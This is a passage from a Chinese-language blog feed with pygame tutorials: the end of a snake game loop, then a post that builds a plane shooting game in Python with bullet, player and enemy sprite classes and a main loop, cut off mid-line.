class="line"></span><br><span class="line">        snake_head = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        snake_head.append(load_x)</span><br><span class="line">        snake_head.append(load_y)</span><br><span class="line"></span><br><span class="line">        snake_list.append(snake_head)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> len(snake_list) &gt; snake_length:</span><br><span class="line">            <span class="keyword">del</span> snake_list[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        snake(snake_list)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> abs(load_x-Apple_x) &lt; <span class="number">10</span> <span class="keyword">and</span> abs(load_y-Apple_y) &lt; <span class="number">10</span>:</span><br><span class="line">            Apple_x = (random.randrange(<span class="number">0</span>, screen_width - rect_size) / <span class="number">10</span>) * <span class="number">10</span></span><br><span class="line">            Apple_y = (random.randrange(<span class="number">0</span>, screen_height - rect_size) / <span class="number">10</span>) * <span class="number">10</span></span><br><span class="line">            snake_length += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        pygame.display.update()</span><br><span class="line"></span><br><span class="line">        clock.tick(FPS)</span><br><span class="line"></span><br><span class="line">gameLoop()</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD0;&#x884C;&#x7ED3;&#x679C;&#xFF1A;<br><img src="http://p4wiqzx0i.bkt.clouddn.com/Screenshot%20from%202018-10-10%2018-57-41.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> pygame </category>
          
          <category> game </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> game </tag>
            
            <tag> pygame </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pygame development plane game</title>
      <link href="/2018/10/09/Pygame-development-plane-game/"/>
      <url>/2018/10/09/Pygame-development-plane-game/</url>
      
        <content type="html"><![CDATA[<p><img src="http://p4wiqzx0i.bkt.clouddn.com/ncn49.jpg" alt=""></p><a id="more"></a><p>Python&#x771F;&#x662F;&#x592A;&#x5F3A;&#x5927;&#x4E86;&#xFF0C;&#x5F53;&#x6211;&#x770B;&#x5230;&#x522B;&#x4EBA;&#x7528;pygame&#x5199;&#x51FA;&#x7684;Super Mario&#x65F6;&#x2026;&#x2026;&#x8FD8;&#x6709;&#x5C31;&#x662F;&#x4E00;&#x4E2A;12&#x5C81;&#x7684;&#x5C0F;&#x5B69;&#x7ADF;&#x7136;&#x80FD;&#x5199;&#x51FA;&#x201C;&#x5154;&#x5B50;&#x548C;&#x737E;&#x201D;&#x8FD9;&#x6837;&#x7684;&#x6E38;&#x620F;&#x6765;&#x3002;&#x5728;&#x60F3;&#x60F3;&#x90A3;&#x65F6;&#x7684;&#x81EA;&#x5DF1;&#xFF0C;&#x771F;&#x7684;&#x662F;&#x7FA1;&#x6155;&#xFF0C;&#x5AC9;&#x5992;&#xFF0C;&#x6068;&#x5440;&#xFF01;</p><p><a href="http://python.jobbole.com/46308/" target="_blank" rel="noopener">&#x5154;&#x5B50;&#x548C;&#x737E;</a><br><img src="http://p4wiqzx0i.bkt.clouddn.com/Screen-Shot-2012-12-18-at-6_00_31-PM.png" alt=""><br><a href="https://github.com/justinmeister/Mario-Level-1" target="_blank" rel="noopener">Super Mario</a><br><img src="http://p4wiqzx0i.bkt.clouddn.com/Screenshot%20from%202018-10-09%2021-32-53.png" alt=""><br>&#x771F;&#x7684;&#x662F;&#x592A;&#x5389;&#x5BB3;&#x4E86;</p><p>game.py<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line"><span class="keyword">from</span> pygame.locals <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x8BBE;&#x7F6E;&#x6E38;&#x620F;&#x5C4F;&#x5E55;&#x5927;&#x5C0F;</span></span><br><span class="line">SCREEN_WIDTH = <span class="number">480</span></span><br><span class="line">SCREEN_HEIGHT = <span class="number">800</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x5B50;&#x5F39;&#x7C7B;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bullet</span><span class="params">(pygame.sprite.Sprite)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, bullet_img, init_pos)</span>:</span></span><br><span class="line">        pygame.sprite.Sprite.__init__(self)</span><br><span class="line">        self.image = bullet_img</span><br><span class="line">        self.rect = self.image.get_rect()</span><br><span class="line">        self.rect.midbottom = init_pos</span><br><span class="line">        self.speed = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">move</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.rect.top -= self.speed</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x73A9;&#x5BB6;&#x98DE;&#x673A;&#x7C7B;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Player</span><span class="params">(pygame.sprite.Sprite)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, plane_img, player_rect, init_pos)</span>:</span></span><br><span class="line">        pygame.sprite.Sprite.__init__(self)</span><br><span class="line">        self.image = []                                 <span class="comment"># &#x7528;&#x6765;&#x5B58;&#x50A8;&#x73A9;&#x5BB6;&#x98DE;&#x673A;&#x56FE;&#x7247;&#x7684;&#x5217;&#x8868;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(player_rect)):</span><br><span class="line">            self.image.append(plane_img.subsurface(player_rect[i]).convert_alpha())</span><br><span class="line">        self.rect = player_rect[<span class="number">0</span>]                      <span class="comment"># &#x521D;&#x59CB;&#x5316;&#x56FE;&#x7247;&#x6240;&#x5728;&#x7684;&#x77E9;&#x5F62;</span></span><br><span class="line">        self.rect.topleft = init_pos                    <span class="comment"># &#x521D;&#x59CB;&#x5316;&#x77E9;&#x5F62;&#x7684;&#x5DE6;&#x4E0A;&#x89D2;&#x5750;&#x6807;</span></span><br><span class="line">        self.speed = <span class="number">8</span>                                  <span class="comment"># &#x521D;&#x59CB;&#x5316;&#x73A9;&#x5BB6;&#x98DE;&#x673A;&#x901F;&#x5EA6;&#xFF0C;&#x8FD9;&#x91CC;&#x662F;&#x4E00;&#x4E2A;&#x786E;&#x5B9A;&#x7684;&#x503C;</span></span><br><span class="line">        self.bullets = pygame.sprite.Group()            <span class="comment"># &#x73A9;&#x5BB6;&#x98DE;&#x673A;&#x6240;&#x53D1;&#x5C04;&#x7684;&#x5B50;&#x5F39;&#x7684;&#x96C6;&#x5408;</span></span><br><span class="line">        self.img_index = <span class="number">0</span>                              <span class="comment"># &#x73A9;&#x5BB6;&#x98DE;&#x673A;&#x56FE;&#x7247;&#x7D22;&#x5F15;</span></span><br><span class="line">        self.is_hit = <span class="keyword">False</span>                             <span class="comment"># &#x73A9;&#x5BB6;&#x662F;&#x5426;&#x88AB;&#x51FB;&#x4E2D;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#x53D1;&#x5C04;&#x5B50;&#x5F39;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">shoot</span><span class="params">(self, bullet_img)</span>:</span></span><br><span class="line">        bullet = Bullet(bullet_img, self.rect.midtop)</span><br><span class="line">        self.bullets.add(bullet)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#x5411;&#x4E0A;&#x79FB;&#x52A8;&#xFF0C;&#x9700;&#x8981;&#x5224;&#x65AD;&#x8FB9;&#x754C;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">moveUp</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.rect.top &lt;= <span class="number">0</span>:</span><br><span class="line">            self.rect.top = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.rect.top -= self.speed</span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#x5411;&#x4E0B;&#x79FB;&#x52A8;&#xFF0C;&#x9700;&#x8981;&#x5224;&#x65AD;&#x8FB9;&#x754C;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">moveDown</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.rect.top &gt;= SCREEN_HEIGHT - self.rect.height:</span><br><span class="line">            self.rect.top = SCREEN_HEIGHT - self.rect.height</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.rect.top += self.speed</span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#x5411;&#x5DE6;&#x79FB;&#x52A8;&#xFF0C;&#x9700;&#x8981;&#x5224;&#x65AD;&#x8FB9;&#x754C;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">moveLeft</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.rect.left &lt;= <span class="number">0</span>:</span><br><span class="line">            self.rect.left = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.rect.left -= self.speed</span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#x5411;&#x53F3;&#x79FB;&#x52A8;&#xFF0C;&#x9700;&#x8981;&#x5224;&#x65AD;&#x8FB9;&#x754C;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">moveRight</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.rect.left &gt;= SCREEN_WIDTH - self.rect.width:</span><br><span class="line">            self.rect.left = SCREEN_WIDTH - self.rect.width</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.rect.left += self.speed</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x654C;&#x673A;&#x7C7B;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Enemy</span><span class="params">(pygame.sprite.Sprite)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, enemy_img, enemy_down_imgs, init_pos)</span>:</span></span><br><span class="line">       pygame.sprite.Sprite.__init__(self)</span><br><span class="line">       self.image = enemy_img</span><br><span class="line">       self.rect = self.image.get_rect()</span><br><span class="line">       self.rect.topleft = init_pos</span><br><span class="line">       self.down_imgs = enemy_down_imgs</span><br><span class="line">       self.speed = <span class="number">2</span></span><br><span class="line">       self.down_index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#x654C;&#x673A;&#x79FB;&#x52A8;&#xFF0C;&#x8FB9;&#x754C;&#x5224;&#x65AD;&#x53CA;&#x5220;&#x9664;&#x5728;&#x6E38;&#x620F;&#x4E3B;&#x5FAA;&#x73AF;&#x91CC;&#x5904;&#x7406;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">move</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.rect.top += self.speed</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x521D;&#x59CB;&#x5316; pygame</span></span><br><span class="line">pygame.init()</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x8BBE;&#x7F6E;&#x6E38;&#x620F;&#x754C;&#x9762;&#x5927;&#x5C0F;&#x3001;&#x80CC;&#x666F;&#x56FE;&#x7247;&#x53CA;&#x6807;&#x9898;</span></span><br><span class="line"><span class="comment"># &#x6E38;&#x620F;&#x754C;&#x9762;&#x50CF;&#x7D20;&#x5927;&#x5C0F;</span></span><br><span class="line">screen = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT))</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x6E38;&#x620F;&#x754C;&#x9762;&#x6807;&#x9898;</span></span><br><span class="line">pygame.display.set_caption(<span class="string">&apos;&#x98DE;&#x673A;&#x5927;&#x6218;&apos;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x80CC;&#x666F;&#x56FE;</span></span><br><span class="line">background = pygame.image.load(<span class="string">&apos;PythonShootGame/resources/image/background.png&apos;</span>).convert()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Game Over &#x7684;&#x80CC;&#x666F;&#x56FE;</span></span><br><span class="line">game_over = pygame.image.load(<span class="string">&apos;PythonShootGame/resources/image/gameover.png&apos;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x98DE;&#x673A;&#x53CA;&#x5B50;&#x5F39;&#x56FE;&#x7247;&#x96C6;&#x5408;</span></span><br><span class="line">plane_img = pygame.image.load(<span class="string">&apos;PythonShootGame/resources/image/shoot.png&apos;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x8BBE;&#x7F6E;&#x73A9;&#x5BB6;&#x98DE;&#x673A;&#x4E0D;&#x540C;&#x72B6;&#x6001;&#x7684;&#x56FE;&#x7247;&#x5217;&#x8868;&#xFF0C;&#x591A;&#x5F20;&#x56FE;&#x7247;&#x5C55;&#x793A;&#x4E3A;&#x52A8;&#x753B;&#x6548;&#x679C;</span></span><br><span class="line">player_rect = []</span><br><span class="line">player_rect.append(pygame.Rect(<span class="number">0</span>, <span class="number">99</span>, <span class="number">102</span>, <span class="number">126</span>))        <span class="comment"># &#x73A9;&#x5BB6;&#x98DE;&#x673A;&#x56FE;&#x7247;</span></span><br><span class="line">player_rect.append(pygame.Rect(<span class="number">165</span>, <span class="number">360</span>, <span class="number">102</span>, <span class="number">126</span>))</span><br><span class="line">player_rect.append(pygame.Rect(<span class="number">165</span>, <span class="number">234</span>, <span class="number">102</span>, <span class="number">126</span>))     <span class="comment"># &#x73A9;&#x5BB6;&#x7206;&#x70B8;&#x56FE;&#x7247;</span></span><br><span class="line">player_rect.append(pygame.Rect(<span class="number">330</span>, <span class="number">624</span>, <span class="number">102</span>, <span class="number">126</span>))</span><br><span class="line">player_rect.append(pygame.Rect(<span class="number">330</span>, <span class="number">498</span>, <span class="number">102</span>, <span class="number">126</span>))</span><br><span class="line">player_rect.append(pygame.Rect(<span class="number">432</span>, <span class="number">624</span>, <span class="number">102</span>, <span class="number">126</span>))</span><br><span class="line">player_pos = [<span class="number">200</span>, <span class="number">600</span>]</span><br><span class="line">player = Player(plane_img, player_rect, player_pos)</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x5B50;&#x5F39;&#x56FE;&#x7247;</span></span><br><span class="line">bullet_rect = pygame.Rect(<span class="number">1004</span>, <span class="number">987</span>, <span class="number">9</span>, <span class="number">21</span>)</span><br><span class="line">bullet_img = plane_img.subsurface(bullet_rect)</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x654C;&#x673A;&#x4E0D;&#x540C;&#x72B6;&#x6001;&#x7684;&#x56FE;&#x7247;&#x5217;&#x8868;&#xFF0C;&#x591A;&#x5F20;&#x56FE;&#x7247;&#x5C55;&#x793A;&#x4E3A;&#x52A8;&#x753B;&#x6548;&#x679C;</span></span><br><span class="line">enemy1_rect = pygame.Rect(<span class="number">534</span>, <span class="number">612</span>, <span class="number">57</span>, <span class="number">43</span>)</span><br><span class="line">enemy1_img = plane_img.subsurface(enemy1_rect)</span><br><span class="line">enemy1_down_imgs = []</span><br><span class="line">enemy1_down_imgs.append(plane_img.subsurface(pygame.Rect(<span class="number">267</span>, <span class="number">347</span>, <span class="number">57</span>, <span class="number">43</span>)))</span><br><span class="line">enemy1_down_imgs.append(plane_img.subsurface(pygame.Rect(<span class="number">873</span>, <span class="number">697</span>, <span class="number">57</span>, <span class="number">43</span>)))</span><br><span class="line">enemy1_down_imgs.append(plane_img.subsurface(pygame.Rect(<span class="number">267</span>, <span class="number">296</span>, <span class="number">57</span>, <span class="number">43</span>)))</span><br><span class="line">enemy1_down_imgs.append(plane_img.subsurface(pygame.Rect(<span class="number">930</span>, <span class="number">697</span>, <span class="number">57</span>, <span class="number">43</span>)))</span><br><span class="line"></span><br><span class="line">enemies1 = pygame.sprite.Group()</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x5B58;&#x50A8;&#x88AB;&#x51FB;&#x6BC1;&#x7684;&#x98DE;&#x673A;&#xFF0C;&#x7528;&#x6765;&#x6E32;&#x67D3;&#x51FB;&#x6BC1;&#x52A8;&#x753B;</span></span><br><span class="line">enemies_down = pygame.sprite.Group()</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x521D;&#x59CB;&#x5316;&#x5C04;&#x51FB;&#x53CA;&#x654C;&#x673A;&#x79FB;&#x52A8;&#x9891;&#x7387;</span></span><br><span class="line">shoot_frequency = <span class="number">0</span></span><br><span class="line">enemy_frequency = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x73A9;&#x5BB6;&#x98DE;&#x673A;&#x88AB;&#x51FB;&#x4E2D;&#x540E;&#x7684;&#x6548;&#x679C;&#x5904;&#x7406;</span></span><br><span class="line">player_down_index = <span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x521D;&#x59CB;&#x5316;&#x5206;&#x6570;</span></span><br><span class="line">score = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x6E38;&#x620F;&#x5FAA;&#x73AF;&#x5E27;&#x7387;&#x8BBE;&#x7F6E;</span></span><br><span class="line">clock = pygame.time.Clock()</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x5224;&#x65AD;&#x6E38;&#x620F;&#x5FAA;&#x73AF;&#x9000;&#x51FA;&#x7684;&#x53C2;&#x6570;</span></span><br><span class="line">running = <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x6E38;&#x620F;&#x4E3B;&#x5FAA;&#x73AF;</span></span><br><span class="line"><span class="keyword">while</span> running:</span><br><span class="line">    <span class="comment"># &#x63A7;&#x5236;&#x6E38;&#x620F;&#x6700;&#x5927;&#x5E27;&#x7387;&#x4E3A; 60</span></span><br><span class="line">    clock.tick(<span class="number">60</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#x751F;&#x6210;&#x5B50;&#x5F39;&#xFF0C;&#x9700;&#x8981;&#x63A7;&#x5236;&#x53D1;&#x5C04;&#x9891;&#x7387;</span></span><br><span class="line">    <span class="comment"># &#x9996;&#x5148;&#x5224;&#x65AD;&#x73A9;&#x5BB6;&#x98DE;&#x673A;&#x6CA1;&#x6709;&#x88AB;&#x51FB;&#x4E2D;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> player.is_hit:</span><br><span class="line">        <span class="keyword">if</span> shoot_frequency % <span class="number">15</span> == <span class="number">0</span>:</span><br><span class="line">            player.shoot(bullet_img)</span><br><span class="line">        shoot_frequency += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> shoot_frequency &gt;= <span class="number">15</span>:</span><br><span class="line">            shoot_frequency = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#x751F;&#x6210;&#x654C;&#x673A;&#xFF0C;&#x9700;&#x8981;&#x63A7;&#x5236;&#x751F;&#x6210;&#x9891;&#x7387;</span></span><br><span class="line">    <span class="keyword">if</span> enemy_frequency % <span class="number">50</span> == <span class="number">0</span>:</span><br><span class="line">        enemy1_pos = [random.randint(<span class="number">0</span>, SCREEN_WIDTH - enemy1_rect.width), <span class="number">0</span>]</span><br><span class="line">        enemy1 = Enemy(enemy1_img, enemy1_down_imgs, enemy1_pos)</span><br><span class="line">        enemies1.add(enemy1)</span><br><span class="line">    enemy_frequency += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> enemy_frequency &gt;= <span class="number">100</span>:</span><br><span class="line">        enemy_frequency = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> bullet <span class="keyword">in</span> player.bullets:</span><br><span class="line">        <span class="comment"># &#x4EE5;&#x56FA;&#x5B9A;&#x901F;&#x5EA6;&#x79FB;&#x52A8;&#x5B50;&#x5F39;</span></span><br><span class="line">        bullet.move()</span><br><span class="line">        <span class="comment"># &#x79FB;&#x52A8;&#x51FA;&#x5C4F;&#x5E55;&#x540E;&#x5220;&#x9664;&#x5B50;&#x5F39;</span></span><br><span class="line">        <span class="keyword">if</span> bullet.rect.bottom &lt; <span class="number">0</span>:</span><br><span class="line">            player.bullets.remove(bullet)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> enemy <span class="keyword">in</span> enemies1:</span><br><span class="line">        <span class="comment">#2. &#x79FB;&#x52A8;&#x654C;&#x673A;</span></span><br><span class="line">        enemy.move()</span><br><span class="line">        <span class="comment">#3. &#x654C;&#x673A;&#x4E0E;&#x73A9;&#x5BB6;&#x98DE;&#x673A;&#x78B0;&#x649E;&#x6548;&#x679C;&#x5904;&#x7406;</span></span><br><span class="line">        <span class="keyword">if</span> pygame.sprite.collide_circle(enemy, player):</span><br><span class="line">            enemies_down.add(enemy)</span><br><span class="line">            enemies1.remove(enemy)</span><br><span class="line">            player.is_hit = <span class="keyword">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#4. &#x79FB;&#x52A8;&#x51FA;&#x5C4F;&#x5E55;&#x540E;&#x5220;&#x9664;&#x98DE;&#x673A;</span></span><br><span class="line">        <span class="keyword">if</span> enemy.rect.top &lt; <span class="number">0</span>:</span><br><span class="line">            enemies1.remove(enemy)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#&#x654C;&#x673A;&#x88AB;&#x5B50;&#x5F39;&#x51FB;&#x4E2D;&#x6548;&#x679C;&#x5904;&#x7406;</span></span><br><span class="line">    <span class="comment"># &#x5C06;&#x88AB;&#x51FB;&#x4E2D;&#x7684;&#x654C;&#x673A;&#x5BF9;&#x8C61;&#x6DFB;&#x52A0;&#x5230;&#x51FB;&#x6BC1;&#x654C;&#x673A; Group &#x4E2D;&#xFF0C;&#x7528;&#x6765;&#x6E32;&#x67D3;&#x51FB;&#x6BC1;&#x52A8;&#x753B;</span></span><br><span class="line">    enemies1_down = pygame.sprite.groupcollide(enemies1, player.bullets, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> enemy_down <span class="keyword">in</span> enemies1_down:</span><br><span class="line">        enemies_down.add(enemy_down)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#x7ED8;&#x5236;&#x80CC;&#x666F;</span></span><br><span class="line">    screen.fill(<span class="number">0</span>)</span><br><span class="line">    screen.blit(background, (<span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#x7ED8;&#x5236;&#x73A9;&#x5BB6;&#x98DE;&#x673A;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> player.is_hit:</span><br><span class="line">        screen.blit(player.image[player.img_index], player.rect)</span><br><span class="line">        <span class="comment"># &#x66F4;&#x6362;&#x56FE;&#x7247;&#x7D22;&#x5F15;&#x4F7F;&#x98DE;&#x673A;&#x6709;&#x52A8;&#x753B;&#x6548;&#x679C;</span></span><br><span class="line">        player.img_index = shoot_frequency // <span class="number">8</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># &#x73A9;&#x5BB6;&#x98DE;&#x673A;&#x88AB;&#x51FB;&#x4E2D;&#x540E;&#x7684;&#x6548;&#x679C;&#x5904;&#x7406;</span></span><br><span class="line">        player.img_index = player_down_index 